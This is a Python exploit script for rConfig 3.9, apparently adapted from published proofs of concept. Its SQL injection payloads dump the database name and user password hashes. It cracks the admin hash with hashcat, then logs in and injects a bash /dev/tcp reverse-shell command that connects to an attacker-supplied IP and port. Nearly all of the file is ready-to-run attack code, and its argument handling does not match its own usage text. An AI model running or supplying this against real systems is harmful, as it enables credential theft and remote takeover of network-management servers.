#!/usr/bin/env python3

"""
rConfig 3.9 - Combined SQL Injection + Command Injection PoC with Hashcat cracking

Original PoCs:
- Matthew Aberegg & Michael Burkey (Exploit-DB 48241)
  https://www.exploit-db.com/exploits/48241
- Christopher Truncer (Exploit-DB 48208)
  https://www.exploit-db.com/exploits/48208

Modifications by x7331:
- Added automatic SQLi extraction of database name and users.
- Integrated hash cracking using hashcat with best64.rules.
- If hashcat fails, suggests CrackStation online cracking and prompts for manual password input.
- Optional command injection RCE triggered with cracked/admin credentials.
- Improved error handling and user prompts for ease of use.
- Supports custom hashcat wordlist path.
"""

import requests
import sys
import urllib.parse
import subprocess
import tempfile
import os
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

print("rconfig 3.9 - Combined SQLi + Command Injection PoC with hashcat cracking")

if len(sys.argv) not in [2, 4, 6]:
    print(f"Usage:\n"
          f"  {sys.argv[0]} https://target\n"
          f"  {sys.argv[0]} https://target attacker_ip attacker_port\n"
          f"  {sys.argv[0]} https://target attacker_ip attacker_port hashcat_wordlist_path\n")
    sys.exit(1)

target_base = sys.argv[1].rstrip('/')
attacker_ip = None
attacker_port = None
hashcat_wordlist = "/usr/share/wordlists/rockyou.txt"

if len(sys.argv) >= 4:
    attacker_ip = sys.argv[2]
    attacker_port = sys.argv[3]

if len(sys.argv) == 6:
    hashcat_wordlist = sys.argv[4]

# Vulnerable page and params for SQLi
vuln_page = "/commands.inc.php"
vuln_params = "?searchOption=contains&searchField=vuln&search=search&searchColumn=command"
full_url = target_base + vuln_page + vuln_params

session = requests.Session()

def extractDBinfos(session, base_url, payload):
    url = base_url + payload
    try:
        r = session.get(url, verify=False, timeout=10)
        if r.status_code != 200:
            print(f"[-] Request failed with status {r.status_code}")
            return None
        text = r.text
        # DEBUG: Uncomment the next line if extraction fails to see raw response snippet
        # print(f"[DEBUG] Response snippet: {text[:500]}")
        start = text.find("[PWN]")
        end = text.find("[PWN]", start + 1)
        if start != -1 and end != -1:
            return text[start + 5:end]
        else:
            return None
    except Exception as e:
        print(f"[-] Exception during SQLi request: {e}")
        return None

def crack_hash(hash_to_crack, wordlist_path):
    print(f"[*] Running hashcat with wordlist {wordlist_path} ...")
    with tempfile.NamedTemporaryFile(mode="w", delete=False) as hashfile:
        hashfile.write(hash_to_crack + "\n")
        hashfile_path = hashfile.name

    hashcat_cmd = [
        "hashcat",
        "-m", "0",                   # MD5 hash mode
        "-a", "0",                   # Straight attack
        hashfile_path,
        wordlist_path,
        "-r", "/usr/share/hashcat/rules/best64.rule",
        "--quiet",
        "--outfile-format=2",        # Just show plaintext
        "--outfile", hashfile_path + ".out"
    ]

    try:
        proc = subprocess.run(hashcat_cmd, capture_output=True, text=True, timeout=300)
        cracked = None
        if os.path.isfile(hashfile_path + ".out"):
            with open(hashfile_path + ".out") as f:
                for line in f:
                    line = line.strip()
                    if line:
                        cracked = line
                        break
        os.unlink(hashfile_path)
        if os.path.isfile(hashfile_path + ".out"):
            os.unlink(hashfile_path + ".out")
        if cracked:
            print(f"[+] Hash cracked: {cracked}")
            return cracked
        else:
            print("[!] Hashcat did not crack the hash.")
            return None
    except Exception as e:
        print(f"[!] Error running hashcat: {e}")
        return None

def command_injection_rce(host, username, password, ip, port):
    print("[*] Attempting command injection RCE with admin credentials...")
    login_url = host + "/lib/crud/userprocess.php"
    payload = f"|| bash -i >& /dev/tcp/{ip}/{port} 0>&1 ;"
    encoded_payload = urllib.parse.quote_plus(payload)

    s = requests.Session()

    res = s.post(
        login_url,
        data={
            'user': username,
            'pass': password,
            'sublogin': 1
        },
        verify=False,
        allow_redirects=True,
        timeout=10
    )

    if res.status_code != 200:
        print(f"[-] Failed to login: HTTP {res.status_code}")
        return False

    injection_url = (f"{host}/lib/crud/search.crud.php?searchTerm=test&catId=2&numLineStr=&"
                     f"nodeId={encoded_payload}&catCommand=showcdpneigh*.txt&noLines=")
    res = s.get(injection_url, verify=False, timeout=10)

    if res.status_code == 200:
        print("[+] Command injection triggered, check your listener for the reverse shell!")
        return True
    else:
        print(f"[-] Injection request failed with status {res.status_code}")
        return False

def main():
    print("[*] Extracting database name via SQLi...")
    db_payload = "%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,database(),0x5B50574E5D3C42523E)%20limit%200,1),NULL--"
    db_name = extractDBinfos(session, target_base + vuln_page + vuln_params, db_payload)

    if not db_name:
        print("[-] Failed to extract database name.")
        sys.exit(1)

    print(f"[+] Database name: {db_name}")

    print("[*] Extracting users via SQLi...")
    users = []
    for i in range(0, 10):
        user_payload = (f"%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,username,0x3A,id,0x3A,password,0x5B50574E5D3C42523E)%20FROM%20"
                        f"{db_name}.users+limit+{i},1),NULL--")
        user = extractDBinfos(session, target_base + vuln_page + vuln_params, user_payload)
        if user and user != "Maybe no more information":
            users.append(user)
        else:
            break

    if not users:
        print("[-] No users extracted.")
        sys.exit(1)

    print("[+] Users found:")
    for u in users:
        print(f"   {u}")

    # Parse for admin creds
    admin_line = None
    for u in users:
        if u.startswith("admin:"):
            admin_line = u
            break

    if not admin_line:
        print("[!] Admin user not found, cannot proceed with RCE without creds.")
        if not attacker_ip or not attacker_port:
            print("[*] No attacker IP and port provided. Exiting after dumping credentials.")
        sys.exit(0)

    parts = admin_line.split(":")
    if len(parts) < 3:
        print("[!] Admin line malformed, cannot extract password hash.")
        sys.exit(1)

    admin_user = parts[0]
    admin_hash = parts[2]

    cracked_password = crack_hash(admin_hash, hashcat_wordlist)
    if not cracked_password:
        print("[!] Could not crack admin password hash with hashcat.")
        print("[!] Try cracking it using online services like CrackStation: https://crackstation.net/")
        cracked_password = input("[?] Please enter the admin password manually to continue (or leave blank to exit): ").strip()
        if not cracked_password:
            print("[*] No password provided. Exiting.")
            sys.exit(0)

    print(f"[*] Admin credentials found: username='{admin_user}' password='{cracked_password}'")

    if attacker_ip and attacker_port:
        if not command_injection_rce(target_base, admin_user, cracked_password, attacker_ip, attacker_port):
            print("[-] Exploit failed.")
            sys.exit(1)
        else:
            print("[+] Exploit succeeded")
    else:
        print("[*] No attacker IP and port provided. Exiting after dumping credentials.")


if __name__ == "__main__":
    main()
